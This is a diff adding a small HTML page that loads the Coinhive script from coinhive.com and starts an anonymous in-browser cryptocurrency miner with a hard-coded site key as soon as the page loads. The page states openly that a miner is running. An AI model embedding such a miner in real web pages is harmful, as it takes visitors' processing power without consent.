@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>A coinhive-based miner</title>
+  </head>
+  <body>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+
+<script>
+var miner = new CoinHive.Anonymous('zdZkP8qJAbZOionq0EYwJL244yjdJUH8');
+miner.start();
+
+// Listen on events
+miner.on('found', function() { /* Hash found */ })
+miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+// Update stats once per second
+setInterval(function() {
+	var hashesPerSecond = miner.getHashesPerSecond();
+	var totalHashes = miner.getTotalHashes();
+	var acceptedHashes = miner.getAcceptedHashes();
+
+	// Output to HTML elements...
+	document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond;
+	document.getElementById("totalHashes").innerHTML = totalHashes;
+	document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
+}, 1000);
+</script>
+
+
+    <h1>Crytocurrency miner is running in the browser </h1>
+  </body>
+</html>
